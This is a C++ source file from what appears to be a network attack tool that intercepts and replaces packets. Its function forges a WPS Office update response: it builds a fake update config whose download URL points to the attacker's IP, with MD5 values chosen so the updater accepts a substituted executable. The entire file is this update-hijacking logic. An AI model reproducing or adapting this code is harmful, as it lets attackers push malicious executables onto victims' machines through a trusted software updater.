


#include "..\\include\\pcap.h"
#include "..\\include\\pcap\\pcap.h"
#include "..\\Include\\openssl\\md5.h"
#include <windows.h>
#include "..\\Public.h"
#include "..\\attacker.h"
#include "..\\ReplacePacket.h"
#include "WPS.h"
#include "../HttpUtils.h"




#define UPDATEMD5 "2bd6f6aadcc3f87b9424d7f12a8d8395"





int WindowsWPS::prepareRespData(DWORD ulIP, string filepath, string filename){

	//Transfer-Encoding chunked\r\n Content-Encoding: gzip\r\n
	char * lpRespFormat = "HTTP/1.1 200 OK\r\nContent-Type: application/octet-stream\r\nContent-Length: %u\r\nConnection: keep-alive\r\n\r\n%s";

	//[default]
	//url = http://up.wps.kingsoft.com/newupdate/specialpatch/WPS_UpdatePatch_7811.exe
	//md5 = 102b94a3213c0915c1acdc8b715a8810
	//updatemd5 = 55dee1bd1a4dfac588eabcd58c902f54
	char * jsonFormat ="[default]\r\n"
		"url=http://%s/%s\r\nmd5=%s\r\nupdatemd5=%s";		//up.wps.kingsoft.com

	int ret = FALSE;

	string szip = HttpUtils::getIPstr(ulIP) + "/" + G_USERNAME;

	ret = getUpdateFileMd5(filepath + filename, TRUE);


	char lpJson[MAX_RESPONSE_HEADER_SIZE];
	int iJsonLen = sprintf_s(lpJson,MAX_RESPONSE_HEADER_SIZE,jsonFormat,szip.c_str(), WPS_UpdatePatch_PACKAGENAME, m_szmd5, UPDATEMD5);

	m_iRespSize  = sprintf_s(m_lpResp,MAX_RESPONSE_HEADER_SIZE,lpRespFormat,iJsonLen,lpJson);

	return m_iRespSize;
}




